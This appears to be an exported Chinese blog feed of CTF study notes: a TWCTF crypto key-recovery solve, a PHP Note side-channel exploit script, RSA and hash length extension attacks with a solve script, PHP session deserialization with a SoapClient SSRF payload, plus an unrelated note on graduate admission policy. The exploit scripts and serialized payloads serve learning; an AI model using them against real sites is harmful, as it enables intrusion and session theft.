<p>原理很简单:在这个加密过程中, 低位会影响高位的加密(比如明文的低位和key的低位相加之后会向高位进行进位) 但是不会影响低位本身的加密, 同时高位也不会影响到低位的加密, 因此只要从低位开始一位一位爆破就可以了. 要求已知key的部分和每一组明文中对应的那一部分经过756轮加密之后和密文对应部分一致.</p>
<p>比如</p>
<blockquote>
<p>猜测key的最后一位是1, 和六组明文中每一组的最后一位都分别加密756次, 有六个密文位, 如果和那六组密文的最后一位对应那就可能是key的一部分, 之所以说可能是因为在考虑位数较少的情况下可能存在多种解的情况.</p>
<p>猜测倒数第二位 01或者是11 , 这两个可能都去和六组明文中每一组的最后两位都分别加密756次, 有六个密文位, 如果和那六组密文的最后两位对应那就可能是key的一部分.由此类推……</p>
</blockquote>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROUNDS = <span class="number">765</span></span><br><span class="line">BITS = <span class="number">128</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(msg,key)</span>:</span></span><br><span class="line">    enc = msg</span><br><span class="line">    mask = (<span class="number">1</span> &lt;&lt; BITS) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(ROUNDS):</span><br><span class="line">        enc = (enc + key) &amp; mask</span><br><span class="line">        enc = enc ^ key</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(msg, key)</span>:</span></span><br><span class="line">    enc = msg</span><br><span class="line">    mask = (<span class="number">1</span> &lt;&lt; BITS) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(ROUNDS):</span><br><span class="line">        enc = enc ^ key</span><br><span class="line">        enc = (enc - key) &amp; mask</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">the_flag = <span class="number">0x43713622de24d04b9c05395bb753d437</span></span><br><span class="line"></span><br><span class="line">plain = [<span class="number">0x29abc13947b5373b86a1dc1d423807a</span>,<span class="number">0xeeb83b72d3336a80a853bf9c61d6f254</span>,<span class="number">0x7a0e5ffc7208f978b81475201fbeb3a0</span>,<span class="number">0xc464714f5cdce458f32608f8b5e2002e</span>,<span class="number">0xf944aaccf6779a65e8ba74795da3c41d</span>,<span class="number">0x552682756304d662fa18e624b09b2ac5</span>]</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0xb36b6b62a7e685bd1158744662c5d04a</span>,<span class="number">0x614d86b5b6653cdc8f33368c41e99254</span>,<span class="number">0x292a7ff7f12b4e21db00e593246be5a0</span>,<span class="number">0x64f930da37d494c634fa22a609342ffe</span>,<span class="number">0xaa3825e62d053fb0eb8e7e2621dabfe7</span>,<span class="number">0xf2ffdf4beb933681844c70190ecf60bf</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这边这个算法值得好好体会, 从一位开始向更多的位数进行扩展, 一开始的0,1是对最低位的猜测</span></span><br><span class="line"><span class="comment"># 多解的情况会出现比如10,00,11,01都符合情况</span></span><br><span class="line">q = [<span class="string">'0'</span>,<span class="string">'1'</span>]</span><br><span class="line"><span class="keyword">while</span> len(q) != <span class="number">0</span>:</span><br><span class="line">    key = q.pop(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># 通过flag位来指示操作</span></span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    <span class="comment"># 如果这个key将六组密文解密后的结果与明文都相同, 循环结束得到了key</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> decrypt(int(enc[i]),int(key,<span class="number">2</span>)) != int(plain[i]):</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> key</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">	<span class="comment"># 判断高一位为0是否符合条件, 注意这边rjust(128).replace(' ','0')是为了将所有结果的长度统一到最长, 否则-1-len(key)可能会超出范围</span></span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> bin(decrypt(int(enc[i]),int(<span class="string">'0'</span>+key,<span class="number">2</span>)))[<span class="number">2</span>:].rjust(<span class="number">128</span>).replace(<span class="string">' '</span>,<span class="string">'0'</span>)[<span class="number">-1</span>-len(key):] != bin(plain[i])[<span class="number">2</span>:].rjust(<span class="number">128</span>).replace(<span class="string">' '</span>,<span class="string">'0'</span>)[<span class="number">-1</span>-len(key):]:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        q.append(<span class="string">'0'</span>+key)</span><br><span class="line"><span class="comment"># 判断高一位为1是否符合条件, 注意这边rjust(128).replace(' ','0')是为了将所有结果的长度统一到最长, 否则-1-len(key)可能会超出范围</span></span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> bin(decrypt(int(enc[i]),int(<span class="string">'1'</span>+key,<span class="number">2</span>)))[<span class="number">2</span>:].rjust(<span class="number">128</span>).replace(<span class="string">' '</span>,<span class="string">'0'</span>)[<span class="number">-1</span>-len(key):] != bin(plain[i])[<span class="number">2</span>:].rjust(<span class="number">128</span>).replace(<span class="string">' '</span>,<span class="string">'0'</span>)[<span class="number">-1</span>-len(key):]:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        q.append(<span class="string">'1'</span>+key)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解密flag</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"TWCTF&#123;"</span> + str(hex(decrypt(the_flag,int(key,<span class="number">2</span>)))[<span class="number">2</span>:<span class="number">-1</span>]) + <span class="string">"&#125;"</span></span><br></pre></td></tr></table></figure>

<p>因为是线性方程组,所以还有使用z3的解法:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mport z3</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">BITS = <span class="number">128</span></span><br><span class="line">ROUNDS = <span class="number">765</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(msg, key)</span>:</span></span><br><span class="line">    enc = msg</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(ROUNDS):</span><br><span class="line">        enc = (enc + key)</span><br><span class="line">        enc = enc ^ key</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line">plain1= <span class="number">0x029abc13947b5373b86a1dc1d423807a</span></span><br><span class="line">enc1  = <span class="number">0xb36b6b62a7e685bd1158744662c5d04a</span></span><br><span class="line">plain2= <span class="number">0xeeb83b72d3336a80a853bf9c61d6f254</span></span><br><span class="line">enc2  = <span class="number">0x614d86b5b6653cdc8f33368c41e99254</span></span><br><span class="line">plain3= <span class="number">0x7a0e5ffc7208f978b81475201fbeb3a0</span></span><br><span class="line">enc3  = <span class="number">0x292a7ff7f12b4e21db00e593246be5a0</span></span><br><span class="line">plain4= <span class="number">0xc464714f5cdce458f32608f8b5e2002e</span></span><br><span class="line">enc4  = <span class="number">0x64f930da37d494c634fa22a609342ffe</span></span><br><span class="line">plain5= <span class="number">0xf944aaccf6779a65e8ba74795da3c41d</span></span><br><span class="line">enc5  = <span class="number">0xaa3825e62d053fb0eb8e7e2621dabfe7</span></span><br><span class="line">plain6= <span class="number">0x552682756304d662fa18e624b09b2ac5</span></span><br><span class="line">enc6  = <span class="number">0xf2ffdf4beb933681844c70190ecf60bf</span></span><br><span class="line"></span><br><span class="line">k = z3.BitVec(<span class="string">"k"</span>, <span class="number">128</span>)</span><br><span class="line">s = z3.Solver()</span><br><span class="line">s.add(encrypt(plain1, k) == enc1)</span><br><span class="line">s.add(encrypt(plain2, k) == enc2)</span><br><span class="line">s.add(encrypt(plain3, k) == enc3)</span><br><span class="line">s.add(encrypt(plain4, k) == enc4)</span><br><span class="line">s.add(encrypt(plain5, k) == enc5)</span><br><span class="line">s.add(encrypt(plain6, k) == enc6)</span><br><span class="line">print(s.check())</span><br><span class="line"><span class="keyword">if</span> s.check() == z3.sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    print(m)</span><br></pre></td></tr></table></figure>

<p>然后使用key解密即可</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="PHP-Note"><a href="#PHP-Note" class="headerlink" title="PHP Note"></a>PHP Note</h2><p>考察windows测信道攻击</p>
<p><a href="http://www.rai4over.cn/2019/09/10/TokyoWesterns-CTF-2019-PHP-Note-WriteUp/" target="_blank" rel="noopener">http://www.rai4over.cn/2019/09/10/TokyoWesterns-CTF-2019-PHP-Note-WriteUp/</a></p>
<p>题目标志: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Server: Microsoft-IIS/10.0</span><br></pre></td></tr></table></figure>

<p>可是为什么我的windows defender 拦截不到呢…….</p>
<p>摘录一下脚本, 以后可能用得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    url = <span class="string">"http://phpnote.chal.ctf.westerns.tokyo/"</span></span><br><span class="line">    session = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">10</span>,<span class="number">64</span>):</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            data = &#123;<span class="string">"realname"</span>: <span class="string">"xxxxxxxxxxxx"</span>&#125;</span><br><span class="line">            s.post(url + <span class="string">"/?action=login"</span>, data=data)</span><br><span class="line">            payload = <span class="string">'''&lt;script&gt;</span></span><br><span class="line"><span class="string">            var body = document.body.innerHTML;</span></span><br><span class="line"><span class="string">            var a = &#123;1: ''&#125;;</span></span><br><span class="line"><span class="string">            var x = a[Number(body.charCodeAt('''</span> + str(index) + <span class="string">''') == '''</span> + str(x) + <span class="string">''')];</span></span><br><span class="line"><span class="string">            var mal = "X5O!P%@AP[4\\\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*" + x;</span></span><br><span class="line"><span class="string">            eval(mal);</span></span><br><span class="line"><span class="string">&lt;/script&gt;&lt;body&gt;'''</span></span><br><span class="line">            print(payload)</span><br><span class="line">            data = &#123;<span class="string">"realname"</span>: payload, <span class="string">'nickname'</span>: <span class="string">'&lt;/body&gt;'</span>&#125;</span><br><span class="line">            s.post(url + <span class="string">"/?action=login"</span>, data=data)</span><br><span class="line">            rs = s.get(url + <span class="string">"/?action=index"</span>)</span><br><span class="line">            print(str(index) + <span class="string">'   '</span> + str(x))</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">'Login'</span> <span class="keyword">in</span> rs.text):</span><br><span class="line">                session = session + chr(x)</span><br><span class="line">                print(<span class="string">"session : "</span> + session)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>保研政策解读小记[working]</title>
    <url>/2019/09/04/%E4%BF%9D%E7%A0%94%E6%94%BF%E7%AD%96%E8%A7%A3%E8%AF%BB%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<p>这一届的保研政策变化太大了,为了防止以后忘记重点,有必要记录一下.</p>
<p>综合分 = (绩点+5)<em>8 + (课内知识最终考试 * 0.25 + 英语水平最终考试 * 0.25 + 学术研究能力面试成绩 * 0.1 + (科技竞赛 * 0.5 + 大创 * 0.2 + 学术论文 * 0.15 + 软件专利 * 0.1 + 软件著作权 * 0.05)</em> 0.3 + (思想品德+社会工作+文体活动….)*0.1) * 0.2, 化简一下</p>
<ul>
<li>$$<br>综合分 = 40 + 绩点\times 8 + 课内知识最终考试 \times 0.05 + 英语水平最终考试\times 0.05 \\ + 学术研究能力面试成绩\times 0.02 + 科技竞赛成绩\times 0.03 + 大创\times 0.012 \\ + 学术论文\times  0.009 + 软件专利\times 0.006 + 软件著作权 \times 0.003 \\ + (思想品德社会工作文体活动…..) \times 0.02<br>$$</li>
</ul>
<p>很想吐槽这个公式, 但是又有一件有趣的事情: 时间.</p>
<ul>
<li>综合分和保研名额是在大四上的时候出来的</li>
<li>我们保研投简历主要是在大三进行的工作</li>
<li>那么问题来了, 在投递简历的时候, 势必是不可能写上所谓的综合排名的, 那个时候都没有出来, 那么简历上的排名只能写绩点排名和竞赛奖项而已.</li>
<li>综上, 只要在综合分评定的时候稳住保研资格, 不管综合分有多低, 排名有多靠后, 只要能混到保研资格就行了, 因为心仪的学校不会问我们的综合排名(那个时候夏令营名单已经敲定了), 我们也不需要去和他说.这就导致对面学校对我们的排名印象只停留在简历上的绩点排名和竞赛奖项.</li>
<li>所以, 在保证自己拥有保研资格的前提条件下, 仅仅从政策上来说对于学生保研好坏结果影响不大, 简历照着往年一样写, 综合排名对面学校也来不及看, 该怎样怎样.</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>密码学笔记[working]</title>
    <url>/2019/09/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="一些常识"><a href="#一些常识" class="headerlink" title="一些常识"></a>一些常识</h2><h3 id="关于数论中指数小于0的意思"><a href="#关于数论中指数小于0的意思" class="headerlink" title="关于数论中指数小于0的意思"></a>关于数论中指数小于0的意思</h3><p>在共模攻击中, 可能求出的乘法逆元s2会小于零, 这个时候不可以直接加上e2,  因为这样是不能满足e1s2 + e2s2=1 的条件的. 相反的,应该要处理这个负号.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = invert(c1, n)</span><br><span class="line"><span class="keyword">if</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">    s2 = -s2</span><br><span class="line">    c2 = invert(c2, n)</span><br></pre></td></tr></table></figure>

<p>为什么是这样?, 以前指数为负数的时候往往意味着结果是分数,但是在数论中,意味着逆元, 只要想想分数和这个逆元的定义共同点, 就不难理解了.</p>
<blockquote>
<p>原来的数和这个数经过指数为-1的运算后结果相乘等于1</p>
</blockquote>
<p>这样看来, 求逆元就显得非常合乎情理了.</p>
<h2 id="RSA-的常见几种攻击方法"><a href="#RSA-的常见几种攻击方法" class="headerlink" title="RSA 的常见几种攻击方法"></a>RSA 的常见几种攻击方法</h2><p>De1ctf2019:</p>
<h3 id="低加密指数广播攻击"><a href="#低加密指数广播攻击" class="headerlink" title="低加密指数广播攻击"></a>低加密指数广播攻击</h3><p>特征</p>
<ul>
<li>加密指数低</li>
<li>相同的明文经过相同的加密指数加密后发送给不同的接收方, 接收方的n不一样,因此c也不一样</li>
</ul>
<h3 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h3><p>特征</p>
<ul>
<li>同样的明文,同样的n, 知道了e1 e2 c1 c2</li>
</ul>
<p>攻击<br>$$<br>m^{s_1e_1 + s_2e_2} \equiv m^{s_1e_1}\times m^{s_2e_2} \equiv c_1^{s_1} \times c_2^{s_2} \equiv m \pmod{n}<br>$$</p>
<h2 id="hash长度扩展攻击"><a href="#hash长度扩展攻击" class="headerlink" title="hash长度扩展攻击"></a>hash长度扩展攻击</h2><p> 使用场景</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">md5(salt+message1)</span><br></pre></td></tr></table></figure>

<p>我们知道了message1, 但是想要伪造出md5(salt+message2)</p>
<p>工具使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./hash_extender -d &apos;message1&apos; -s 原哈希 -f md5  -a &apos;message2&apos; --out-data-format=html -l 盐的长度(有时候要爆破) --quiet</span><br></pre></td></tr></table></figure>

<p>然后从一叶飘零博客里面摘抄的一道题的解题脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> httplib <span class="keyword">import</span> HTTPConnection</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> urlencode</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gao</span><span class="params">(x, y)</span>:</span></span><br><span class="line">        <span class="comment">#print x</span></span><br><span class="line">        <span class="comment">#print y</span></span><br><span class="line">    url = <span class="string">"http://web.jarvisoj.com:32778/index.php"</span></span><br><span class="line">    cookie = <span class="string">"role="</span> + x + <span class="string">"; hsh="</span> + y</span><br><span class="line">        <span class="comment">#print cookie</span></span><br><span class="line">    build_header = &#123;</span><br><span class="line">            <span class="string">'Cookie'</span>: cookie,</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0'</span>,</span><br><span class="line">            <span class="string">'Host'</span>: <span class="string">'web.jarvisoj.com:32778'</span>,</span><br><span class="line">            <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    urlparts = urlparse(url)</span><br><span class="line">    conn = HTTPConnection(urlparts.hostname, urlparts.port <span class="keyword">or</span> <span class="number">80</span>)</span><br><span class="line">    conn.request(<span class="string">"GET"</span>, urlparts.path, <span class="string">''</span>, build_header)</span><br><span class="line">    resp = conn.getresponse()</span><br><span class="line">    body = resp.read()</span><br><span class="line">    <span class="keyword">return</span> body</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    <span class="comment"># secret len = ???</span></span><br><span class="line">    find_hash = <span class="string">"./hash_extender -d ';\"tseug\":5:s' -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a ';\"nimda\":5:s' --out-data-format=html -l "</span> + str(i) + <span class="string">" --quiet"</span></span><br><span class="line">    <span class="comment">#print find_hash</span></span><br><span class="line">    calc_res = os.popen(find_hash).readlines()</span><br><span class="line">    hash_value = calc_res[<span class="number">0</span>][:<span class="number">32</span>]</span><br><span class="line">    attack_padding = calc_res[<span class="number">0</span>][<span class="number">32</span>:]</span><br><span class="line">    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::<span class="number">-1</span>])</span><br><span class="line">    ret = gao(attack_padding, hash_value)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Welcome"</span> <span class="keyword">in</span> ret:</span><br><span class="line">        <span class="keyword">print</span> ret</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="关于编码"><a href="#关于编码" class="headerlink" title="关于编码"></a>关于编码</h2><p>libnum.n2s(m)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="comment"># 求逆元</span></span><br><span class="line">d = libnum.invmod(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag.enc'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    c = f.read().encode(<span class="string">'hex'</span>)</span><br><span class="line">    c = int(c,<span class="number">16</span>)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure>

<p>str(hex(……))</p>
]]></content>
  </entry>
  <entry>
    <title>php的两类反序列化</title>
    <url>/2019/09/02/php%E7%9A%84%E4%B8%A4%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>php中的反序列化分为两类: 一种是常规ctf题目中的直接传入并反序列化, 另一种和session有关:</p>
<h2 id="session反序列化漏洞"><a href="#session反序列化漏洞" class="headerlink" title="session反序列化漏洞"></a>session反序列化漏洞</h2><ul>
<li>特征<ul>
<li>phpinfo中默认的session.serialize_handler和本地的值不一样</li>
<li>ini_set(‘session.serialize_handler’, ‘php’);之类的</li>
<li>phpinfo中session.upload_progress.enabled打开</li>
</ul>
</li>
</ul>
<p>一旦发现脚本中的序列化处理器和php.ini设置的不一样,就可能导致这个漏洞.</p>
<p>php用于存取session时候的三种处理器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:键名 ＋ 竖线 ＋ 序列化字符串</span><br><span class="line">php_binary: 键名的长度对应的 ASCII 字符 ＋ 键名 ＋序列化字符串</span><br><span class="line">php_serialize: 序列化字符串</span><br></pre></td></tr></table></figure>

<p>如果以php_serialize 方式存取但是又用php处理器去处理, 那么只要传入的字符串中有 | 就可以导致php处理器将 | 前的东东解释成键, 而将后面的东西解释称值, 而后面的东西一般就是要反序列化的字符串了.</p>
<blockquote>
<p> php5.6.13版本以前是第一个变量解析错误注销第一个变量，然后解析第二个变量，但是5.6.13以后如果第一个变量错误，直接销毁整个session, 所以这个洞要看版本</p>
</blockquote>
<p>将payload传入session的方式有两种, 一种是对面开放本地可控的数据, 另一种是因为配置不当造成session可控</p>
<blockquote>
<p>当session.upload_progress.enabled打开时，php会记录上传文件的进度，在上传时会将其信息保存在$<em>SESSION中。</em></p>
<p>_当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，<br>当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。</p>
</blockquote>
<p>上传表单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中目标网址需要替换, php_session_upload_progress是session.upload_progress.name的名字, 从phpinfo中看.</p>
<p>然后随便传点什么进去. 在burpsuite中做如下修改</p>
<p>将随便传的文件的filename成payload, 比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>这里的斜杆是为了防止转义.签名的竖线就是帮助php处理器解释使用的.</p>
<h2 id="例题LCTF2018-bestphp’s-revenge"><a href="#例题LCTF2018-bestphp’s-revenge" class="headerlink" title="例题LCTF2018-bestphp’s revenge"></a>例题LCTF2018-bestphp’s revenge</h2><p>题目直接给出了源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line"></span><br><span class="line">call_user_func($_GET[<span class="string">'f'</span>], $_POST);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>])) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'name'</span>] = $_GET[<span class="string">'name'</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>整理一下</p>
<ul>
<li><p>call_user_func: 第一个参数是回调函数的名字,第二个之后的参数是回调函数的参数,<strong>特别的,如果传入的是一个数组的话,他会将数组的第一项识别为类和对象,并将之后的参数作为类和对象的方法来调用</strong>.</p>
</li>
<li><p>reset会将数组的第一项作为字符串输出</p>
</li>
<li><p>implode 函数只是合并数组的时候插入一些给定字符而已,无关紧要.</p>
</li>
</ul>
<p>扫描目录发现了flag.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">       $_SESSION[<span class="string">'flag'</span>] = $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>

<p>规定localhost访问,那么必须要找到ssrf的机会.</p>
<p>题目提示反序列化,但是题目源码中没有任何给定的类,在此情况下只能考虑php的原生类.本题采用的是SoapClient类.在这个类的对象调用未知的方法时候就会调用call函数,同时触发请求,这个类支持http/https, 简单的使用实例如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">"http://127.0.0.1:12334/flag.php"</span>;</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'uri'</span> =&gt; $url, <span class="string">'location'</span> =&gt;$url));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$c = unserialize($a);</span><br><span class="line">$c-&gt;a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>nc 接受:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/66317782-bc73c200-e94c-11e9-904b-6e9705595d94.png" alt="image"></p>
<p>那么可以这样子:</p>
<ul>
<li>call_user_func(‘session_start’,’serialize_handler=php_serialize’)提前开启php session并规定好本地的serialize_handler为php_serialize, 而默认的session序列化处理器为php,这就会导致上面说到的session反序列化漏洞.当然,name的值是竖线加上SoapClient序列化字符串,uri和location的值都指向flag.php</li>
<li>session存取完成之后就要想办法去反序列化和触发未知方法,这里使用变量覆盖(<strong>extract</strong>)将b覆盖为call_user_func,因为b有机会接受session反序列化的字符串,并将数组传入b中,调用welcome_to_the_lctf2018方法,从而触发call函数,造成ssrf</li>
<li>最后<strong>ssrf的结果也会存放在sessoin中</strong>,所以获取SoapClient的PHPSSID并去访问index.php(里面有var_dump(session))得到flag</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/40637063/66320601-baf8c880-e951-11e9-8a3f-1bf39a2f08ed.png" alt="1570458197732"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/66320574-a7e5f880-e951-11e9-9f5f-05bddd51af9b.png" alt="1570458295931"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/66320472-78cf8700-e951-11e9-85b2-8f9b18fc9b9d.png" alt="image"></p>
<p>参考</p>
<p><a href="https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/</a></p>
<p> <a href="http://www.91ri.org15925.html" target="_blank" rel="noopener">http://www.91ri.org15925.html</a></p>
<p><a href="https://skysec.top/2017/08/16/jarvisoj-web/#PHPINFO" target="_blank" rel="noopener">https://skysec.top/2017/08/16/jarvisoj-web/#PHPINFO</a></p>
<p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a></p>
]]></content>
  </entry>
  <entry>
    <title>openssl笔记</title>
    <url>/2019/09/01/openssl%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="信息提取"><a href="#信息提取" class="headerlink" title="信息提取"></a>信息提取</h2><p>生成一个包含密钥和公钥的文件,既可以用来加密也可以用来解密.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out target.key 1024</span><br></pre></td></tr></table></figure>

